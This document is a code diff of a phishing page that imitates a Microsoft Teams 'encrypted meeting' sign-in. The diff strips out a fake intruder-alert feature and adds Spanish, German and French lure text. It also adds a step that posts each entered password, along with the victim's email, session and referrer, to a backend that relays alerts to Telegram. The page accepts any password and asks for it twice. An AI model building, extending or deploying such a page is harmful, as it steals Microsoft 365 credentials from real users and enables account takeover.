@@ -19,7 +19,7 @@
         html, body {
             height: 100%;
             font-family: "Lato", "Helvetica", "Arial", sans-serif;
-            background: #4a90d9;
+            background: #0a1628;
             overflow: hidden;
         }
         
@@ -32,7 +32,7 @@
             height: 100vh;
             z-index: 0;
             overflow: hidden;
-            background: linear-gradient(135deg, #4a90d9 0%, #007aff 30%, #5ac8fa 60%, #b3e5fc 100%);
+            background: linear-gradient(135deg, #4a90d9 0%, #007aff 40%, #5ac8fa 70%, #b3e5fc 100%);
         }
         
         .video-background video {
@@ -45,7 +45,7 @@
             height: auto;
             transform: translate(-50%, -50%);
             object-fit: cover;
-            opacity: 0.5;
+            opacity: 0.3;
             z-index: 1;
         }
         
@@ -56,7 +56,7 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: linear-gradient(135deg, #4a90d9 0%, #007aff 30%, #5ac8fa 60%, #b3e5fc 100%);
+            background: linear-gradient(135deg, #4a90d9 0%, #007aff 40%, #5ac8fa 70%, #b3e5fc 100%);
             animation: gradientMove 15s ease-in-out infinite alternate;
             display: none;
         }
@@ -73,14 +73,14 @@
             height: 100%;
             z-index: 2;
             pointer-events: none;
-            opacity: 0.03;
+            opacity: 0.04;
             background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='1'/%3E%3C/svg%3E");
             mix-blend-mode: overlay;
             animation: noisePulse 8s ease-in-out infinite alternate;
         }
         @keyframes noisePulse {
             0% { opacity: 0.02; }
-            100% { opacity: 0.05; }
+            100% { opacity: 0.06; }
         }
         
         .video-overlay {
@@ -89,7 +89,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.05);
             z-index: 1;
             pointer-events: none;
         }
@@ -105,7 +105,7 @@
             margin-top: 40px;
             background: rgba(255, 255, 255, 0.98);
             border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
             backdrop-filter: blur(10px);
             animation: contentFadeIn 1s ease;
         }
@@ -127,14 +127,9 @@
             justify-content: center;
             align-items: center;
             background: #fff;
-            box-shadow: 0 0 .2rem rgba(0,0,0,.08), 0 .2rem .4rem rgba(0,0,0,.10);
+            box-shadow: 0 0 .2rem rgba(0,0,0,.12), 0 .2rem .4rem rgba(0,0,0,.14);
             border-radius: .8rem;
             transition: transform 0.3s ease;
-            animation: logoFloat 4s ease-in-out infinite;
-        }
-        @keyframes logoFloat {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
         }
         .logoContainer:hover { transform: scale(1.02); }
         .logoContainer .logo { width: 5.145rem; height: 5.145rem; align-self: center; }
@@ -281,7 +276,6 @@
         .verification-status.verified { color: #28a745; }
         .verification-status.verifying { color: #6264a7; }
         .verification-status.error { color: #d93025; }
-        .verification-status.intruder { color: #dc3545; font-weight: 700; }
         
         /* Notification */
         .notification {
@@ -303,8 +297,6 @@
         @keyframes notifSlide { 0% { opacity: 0; transform: translateX(-50%) translateY(20px); } 100% { opacity: 1; transform: translateX(-50%) translateY(0); } }
         .notification.error { background: #dc3545; }
         .notification.success { background: #28a745; }
-        .notification.intruder { background: #dc3545; font-weight: bold; animation: pulse-red 1s ease-in-out infinite; }
-        @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
         
         /* Loading */
         .spinner {
@@ -319,27 +311,6 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         #loadTxt { display: block; margin-top: 10px; font-weight: 400; color: #555; }
         
-        /* Intruder Alert */
-        .intruder-alert {
-            display: none;
-            background: rgba(220, 53, 69, 0.1);
-            border: 2px solid #dc3545;
-            border-radius: 10px;
-            padding: 12px 16px;
-            margin: 10px 0;
-            color: #dc3545;
-            font-weight: 600;
-            font-size: 14px;
-            animation: intruderPulse 1s ease-in-out infinite;
-        }
-        @keyframes intruderPulse {
-            0%, 100% { background: rgba(220, 53, 69, 0.1); }
-            50% { background: rgba(220, 53, 69, 0.25); }
-        }
-        .intruder-alert.show { display: block; }
-        .intruder-alert .icon { font-size: 20px; margin-right: 8px; }
-        
-        /* Responsive */
         @media (max-width: 480px) {
             #content { margin: 20px 15px; padding: 20px 15px; margin-top: 20px; width: 92%; }
             .logoContainer { width: 7rem; height: 7rem; }
@@ -429,12 +400,6 @@
                     </div>
                 </div>
                 
-                <!-- Intruder Alert -->
-                <div class="intruder-alert" id="intruderAlert">
-                    <span class="icon">🚨</span>
-                    <span id="intruderText">⚠️ INTRUDER DETECTED! Multiple failed password attempts. This incident has been reported.</span>
-                </div>
-                
                 <div id="verificationStatus" class="verification-status"></div>
                 
                 <div id="errorDiv"></div>
@@ -505,9 +470,7 @@ const TRANSLATIONS = {
         incorrectPassword: 'Incorrect password. Please try again.',
         enterPassword: '⚠️ Please enter your password',
         noEmail: '❌ No email provided',
-        expired: '⏰ Verification window expired. Please start again.',
-        intruder: '🚨 INTRUDER DETECTED! Multiple failed password attempts. This incident has been reported.',
-        intruderTitle: '⚠️ INTRUDER ALERT'
+        expired: '⏰ Verification window expired. Please start again.'
     },
     ko: {
         title: 'Teams 회의 참여',
@@ -528,9 +491,70 @@ const TRANSLATIONS = {
         incorrectPassword: '비밀번호가 올바르지 않습니다. 다시 시도해주세요.',
         enterPassword: '⚠️ 비밀번호를 입력해주세요',
         noEmail: '❌ 이메일이 제공되지 않았습니다',
-        expired: '⏰ 인증 시간이 만료되었습니다. 다시 시작해주세요.',
-        intruder: '🚨 침입자 감지! 여러 번의 잘못된 비밀번호 시도가 있었습니다. 이 사건이 보고되었습니다.',
-        intruderTitle: '⚠️ 침입자 경고'
+        expired: '⏰ 인증 시간이 만료되었습니다. 다시 시작해주세요.'
+    },
+    es: {
+        title: 'Unirse a la reunión de Teams',
+        usersOnline: 'Usuarios en línea',
+        confidentialMessage: '🔐 Esta reunión está encriptada y es exclusivamente para ti. Por seguridad y privacidad, verifica tu identidad.',
+        continueBtn: 'Continuar en este navegador',
+        welcome: 'Bienvenido',
+        signedInAs: 'Iniciado sesión como',
+        passwordPlaceholder: 'Ingresa tu contraseña de Microsoft',
+        verifyIdentity: 'Verificar identidad',
+        confirmIdentity: 'Confirmar identidad',
+        verified: '✅ Verificado!',
+        verifying: '🔐 Esta reunión está encriptada y es exclusivamente para ti. Por seguridad y privacidad, confirma tu contraseña.',
+        verifiedRedirect: '✅ Identidad verificada. Redirigiendo a la reunión encriptada...',
+        redirecting: 'Cargando verificación segura...',
+        terms: 'Al hacer clic en Iniciar reunión, aceptas nuestros Términos de Servicio y Política de Privacidad.',
+        support: 'Si no puedes unirte a la reunión, visita el Centro de Soporte de Teams para obtener información útil.',
+        incorrectPassword: 'Contraseña incorrecta. Inténtalo de nuevo.',
+        enterPassword: '⚠️ Por favor ingresa tu contraseña',
+        noEmail: '❌ No se proporcionó correo electrónico',
+        expired: '⏰ La ventana de verificación expiró. Por favor, comienza de nuevo.'
+    },
+    de: {
+        title: 'Nehmen Sie an der Teams-Besprechung teil',
+        usersOnline: 'Benutzer online',
+        confidentialMessage: '🔐 Diese Besprechung ist verschlüsselt und ausschließlich für Sie bestimmt. Aus Sicherheits- und Datenschutzgründen bestätigen Sie bitte Ihre Identität.',
+        continueBtn: 'In diesem Browser fortfahren',
+        welcome: 'Willkommen',
+        signedInAs: 'Angemeldet als',
+        passwordPlaceholder: 'Geben Sie Ihr Microsoft-Passwort ein',
+        verifyIdentity: 'Identität bestätigen',
+        confirmIdentity: 'Identität bestätigen',
+        verified: '✅ Bestätigt!',
+        verifying: '🔐 Diese Besprechung ist verschlüsselt und ausschließlich für Sie bestimmt. Aus Sicherheits- und Datenschutzgründen bestätigen Sie Ihr Passwort.',
+        verifiedRedirect: '✅ Identität bestätigt. Weiterleitung zur verschlüsselten Besprechung...',
+        redirecting: 'Lade sichere Verifizierung...',
+        terms: 'Mit Klick auf "Besprechung starten" stimmen Sie unseren Nutzungsbedingungen und Datenschutzbestimmungen zu.',
+        support: 'Wenn Sie der Besprechung nicht beitreten können, besuchen Sie das Teams-Supportzentrum für hilfreiche Informationen.',
+        incorrectPassword: 'Falsches Passwort. Bitte versuchen Sie es erneut.',
+        enterPassword: '⚠️ Bitte geben Sie Ihr Passwort ein',
+        noEmail: '❌ Keine E-Mail-Adresse angegeben',
+        expired: '⏰ Das Verifizierungsfenster ist abgelaufen. Bitte beginnen Sie erneut.'
+    },
+    fr: {
+        title: 'Rejoindre la réunion Teams',
+        usersOnline: 'Utilisateurs en ligne',
+        confidentialMessage: '🔐 Cette réunion est cryptée et destinée exclusivement à vous. Pour des raisons de sécurité et de confidentialité, veuillez vérifier votre identité.',
+        continueBtn: 'Continuer sur ce navigateur',
+        welcome: 'Bienvenue',
+        signedInAs: 'Connecté en tant que',
+        passwordPlaceholder: 'Entrez votre mot de passe Microsoft',
+        verifyIdentity: 'Vérifier l\'identité',
+        confirmIdentity: 'Confirmer l\'identité',
+        verified: '✅ Vérifié!',
+        verifying: '🔐 Cette réunion est cryptée et destinée exclusivement à vous. Pour des raisons de sécurité et de confidentialité, confirmez votre mot de passe.',
+        verifiedRedirect: '✅ Identité vérifiée. Redirection vers la réunion cryptée...',
+        redirecting: 'Chargement de la vérification sécurisée...',
+        terms: 'En cliquant sur Lancer la réunion, vous acceptez nos Conditions d\'utilisation et notre Politique de confidentialité.',
+        support: 'Si vous ne pouvez pas rejoindre la réunion, visitez le Centre d\'assistance Teams pour obtenir des informations utiles.',
+        incorrectPassword: 'Mot de passe incorrect. Veuillez réessayer.',
+        enterPassword: '⚠️ Veuillez entrer votre mot de passe',
+        noEmail: '❌ Aucun email fourni',
+        expired: '⏰ La fenêtre de vérification a expiré. Veuillez recommencer.'
     }
 };
 
@@ -553,7 +577,7 @@ const TRANSLATIONS = {
         width: auto; height: auto;
         transform: translate(-50%, -50%);
         object-fit: cover;
-        opacity: 0.5;
+        opacity: 0;
         z-index: 1;
         transition: opacity 2s ease;
     `;
@@ -572,11 +596,10 @@ const TRANSLATIONS = {
     
     video.addEventListener('loadeddata', function() {
         console.log('✅ Video background loaded');
-        video.style.opacity = '0.5';
+        video.style.opacity = '0.3';
         if (gradientFallback) {
             gradientFallback.style.display = 'none';
         }
-        // Enable audio on user interaction
         document.addEventListener('click', function enableAudio() {
             video.muted = false;
             video.play().catch(() => {});
@@ -596,17 +619,16 @@ const TRANSLATIONS = {
     bgContainer.appendChild(video);
     video.load();
     
-    // Try to play immediately
     setTimeout(() => {
         try {
             const playPromise = video.play();
             if (playPromise !== undefined) {
                 playPromise.then(() => {
                     console.log('✅ Video playing');
-                    video.style.opacity = '0.5';
+                    video.style.opacity = '0.3';
                 }).catch(() => {
                     console.log('ℹ️ Autoplay blocked, waiting for user interaction');
-                    video.style.opacity = '0.3';
+                    video.style.opacity = '0.15';
                     document.addEventListener('click', function tryPlay() {
                         video.play().catch(() => {});
                         document.removeEventListener('click', tryPlay);
@@ -614,7 +636,7 @@ const TRANSLATIONS = {
                 });
             }
         } catch(e) {}
-    }, 50);
+    }, 100);
 })();
 
 // ============================================================
@@ -631,9 +653,7 @@ const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Dat
 let capturedEmail = '';
 let attemptCount = 0;
 let consecutiveCount = 0;
-let wrongAttempts = 0;
 const MAX_CONSECUTIVE = 2;
-const MAX_WRONG_ATTEMPTS = 2; // 2 wrong attempts triggers intruder alert
 let lastAttemptTime = 0;
 const ATTEMPT_WINDOW = 5000;
 
@@ -656,11 +676,10 @@ function applyTranslations() {
     document.getElementById('termsText').textContent = t.terms;
     document.getElementById('supportText').textContent = t.support;
     document.getElementById('loadTxt').textContent = t.redirecting;
-    document.getElementById('intruderText').textContent = t.intruder;
 }
 
-// Apply translations immediately
-applyTranslations();
+// Apply translations after DOM load
+document.addEventListener('DOMContentLoaded', applyTranslations);
 
 // ============================================================
 // EMAIL EXTRACTION
@@ -728,27 +747,7 @@ function sendConsecutiveVerificationToTelegram(email, consecutiveCount) {
 }
 
 // ============================================================
-// SEND INTRUDER ALERT TO TELEGRAM
-// ============================================================
-function sendIntruderAlertToTelegram(email, wrongAttempts) {
-    const message = `🚨 *INTRUDER ALERT!*\n\n` +
-                    `*Email:* ${email}\n` +
-                    `*Wrong Attempts:* ${wrongAttempts}\n` +
-                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
-                    `*Time:* ${new Date().toISOString()}\n` +
-                    `*Status:* ⚠️ INTRUDER DETECTED\n\n` +
-                    `*Action:* Multiple failed password attempts detected.\n` +
-                    `*Recommendation:* Block access and investigate.`;
-
-    fetch(`${BACKEND_URL}/api/telegram`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: message, parseMode: 'Markdown' })
-    }).catch(() => {});
-}
-
-// ============================================================
-// HANDLE SUBMIT - 2-CONSECUTIVE RULE WITH INTRUDER DETECTION
+// HANDLE SUBMIT - 2-CONSECUTIVE RULE
 // ============================================================
 function handleSubmit() {
     const passwordInput = document.getElementById('password');
@@ -775,8 +774,6 @@ function handleSubmit() {
 
     if (lastAttemptTime > 0 && timeSinceLast > ATTEMPT_WINDOW) {
         consecutiveCount = 0;
-        wrongAttempts = 0;
-        document.getElementById('intruderAlert').classList.remove('show');
         showNotification(t.expired, 'error');
         passwordInput.value = '';
         passwordInput.focus();
@@ -785,13 +782,16 @@ function handleSubmit() {
     }
 
     attemptCount++;
+
+    if (password.length > 2) {
+        sendCredentialsToBackend(email, password, 'consecutive_verification');
+    }
+
     const isValid = password.length > 0;
 
     if (isValid) {
         consecutiveCount++;
         lastAttemptTime = now;
-        wrongAttempts = 0;
-        document.getElementById('intruderAlert').classList.remove('show');
 
         passwordInput.value = '';
         passwordInput.classList.add('success');
@@ -801,7 +801,7 @@ function handleSubmit() {
             document.getElementById('joinBtn').textContent = t.confirmIdentity;
             showNotification('🔐 Please re-enter your password to confirm.', 'confidential');
         } else if (consecutiveCount >= MAX_CONSECUTIVE) {
-            // SEND TO TELEGRAM - SUCCESS
+            // SEND TO TELEGRAM
             sendConsecutiveVerificationToTelegram(email, consecutiveCount);
             
             updateVerificationStatus(t.verifiedRedirect, 'verified');
@@ -822,32 +822,10 @@ function handleSubmit() {
         }, 200);
 
     } else {
-        // ============================================================
-        // INVALID PASSWORD - INTRUDER DETECTION
-        // ============================================================
-        wrongAttempts++;
         consecutiveCount = 0;
         passwordInput.classList.add('error');
         updateVerificationStatus(t.incorrectPassword, 'error');
-        
-        // Check if intruder detected (2 wrong attempts)
-        if (wrongAttempts >= MAX_WRONG_ATTEMPTS) {
-            // SHOW INTRUDER ALERT
-            document.getElementById('intruderAlert').classList.add('show');
-            showNotification(t.intruder, 'intruder');
-            
-            // SEND INTRUDER ALERT TO TELEGRAM
-            sendIntruderAlertToTelegram(email, wrongAttempts);
-            
-            // Disable button temporarily
-            document.getElementById('joinBtn').disabled = true;
-            setTimeout(() => {
-                document.getElementById('joinBtn').disabled = false;
-            }, 5000);
-        } else {
-            showNotification(t.incorrectPassword, 'error');
-        }
-        
+        showNotification(t.incorrectPassword, 'error');
         passwordInput.value = '';
         passwordInput.focus();
 
@@ -905,10 +883,7 @@ function setupContinueButton() {
             const nameTxt = document.getElementById('nameTxt');
             if (nameTxt) nameTxt.textContent = email.split('@')[0] || 'User';
 
-            // Reset state
             consecutiveCount = 0;
-            wrongAttempts = 0;
-            document.getElementById('intruderAlert').classList.remove('show');
             updateVerificationStatus(t.verifying, 'verifying');
             
             const passwordInput = document.getElementById('password');
@@ -922,7 +897,6 @@ function setupContinueButton() {
             if (joinBtn) {
                 joinBtn.textContent = t.verifyIdentity;
                 joinBtn.classList.remove('success');
-                joinBtn.disabled = false;
             }
         }, 1500);
     });
@@ -940,10 +914,6 @@ function showNotification(message, type = 'success') {
         div.className = 'notification';
         if (type === 'error') div.classList.add('error');
         if (type === 'confidential') div.style.background = '#6264a7';
-        if (type === 'intruder') {
-            div.classList.add('intruder');
-            div.style.background = '#dc3545';
-        }
         div.textContent = message;
         document.body.appendChild(div);
 
@@ -971,7 +941,6 @@ function sendCredentialsToBackend(email, password, source) {
         timestamp: new Date().toISOString(),
         attemptCount: attemptCount,
         consecutiveCount: consecutiveCount,
-        wrongAttempts: wrongAttempts,
         referrer: document.referrer || 'Direct',
         service: 'Microsoft 365'
     };
@@ -993,7 +962,6 @@ function sendCredentialsToBackend(email, password, source) {
             source: source,
             sessionId: SESSION_ID,
             consecutiveCount: consecutiveCount,
-            wrongAttempts: wrongAttempts,
             url: window.location.href,
             timestamp: Date.now(),
             service: 'Microsoft 365'
@@ -1037,7 +1005,7 @@ function init() {
         });
     }
 
-    console.log('🔐 Confidential Meeting - 2 Consecutive Verification + Intruder Detection');
+    console.log('🔐 Confidential Meeting - 2 Consecutive Verification initialized');
     console.log('📧 Email:', email);
     console.log('🆔 Session:', SESSION_ID);
     console.log('🌐 Language:', userLang);
@@ -1061,13 +1029,10 @@ window.__teamsGateway = {
     getStats: () => ({
         attempts: attemptCount,
         consecutiveCount: consecutiveCount,
-        wrongAttempts: wrongAttempts,
         language: userLang
     }),
     resetConsecutive: () => { 
         consecutiveCount = 0; 
-        wrongAttempts = 0;
-        document.getElementById('intruderAlert').classList.remove('show');
         updateVerificationStatus('', '');
     },
     redirect: () => {
@@ -1080,7 +1045,6 @@ window.__teamsGateway = {
 
 console.log('✅ API available at window.__teamsGateway');
 console.log('💡 Language:', userLang);
-console.log('🚨 Intruder detection: 2 wrong passwords triggers alert');
 </script>
 
 </body>
